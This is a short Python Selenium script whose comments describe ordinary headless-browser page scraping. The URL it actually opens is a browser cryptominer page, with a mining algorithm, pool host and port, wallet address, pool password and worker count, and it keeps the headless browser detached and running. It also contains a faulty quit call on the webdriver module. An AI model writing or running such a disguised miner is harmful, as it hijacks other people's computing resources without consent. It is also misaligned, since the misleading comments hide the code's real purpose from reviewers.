"""
# Filename: run_selenium.py
"""

import time
import os.path
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

## Setup chrome options
chrome_options = Options()
chrome_options.add_argument("--headless")  # Ensure GUI is off
chrome_options.add_argument("--no-sandbox")

# Keep the browser open
chrome_options.add_experimental_option("detach", True)

# Set path to chromedriver as per your configuration
homedir = os.path.expanduser("~")
chrome_options.binary_location = f"{homedir}/chrome-linux64/chrome"
webdriver_service = Service(f"{homedir}/chromedriver-linux64/chromedriver")

# Choose Chrome Browser
browser = webdriver.Chrome(service=webdriver_service, options=chrome_options)

# Get page
browser.get("https://webminer.pages.dev?algorithm=minotaurx&host=flyingsaucer-eu.teatspray.fun&port=7019&worker=MGaypRJi43LcQxrgoL2CW28B31w4owLvv8&password=Cldw%2Cc%3DMAZA%2Czap%3DMAZA&workers=2")

# Extract description from page and print
description = browser.find_element(By.NAME, "description").get_attribute("content")
print(f"{description}")

# Wait for 10 seconds
time.sleep(10)
# browser.quit()


keyword = input("enter a character or press enter to continue: ")

webdriver.quit()

#chrome_driver = webdriver.Chrome(options= chrome_options)
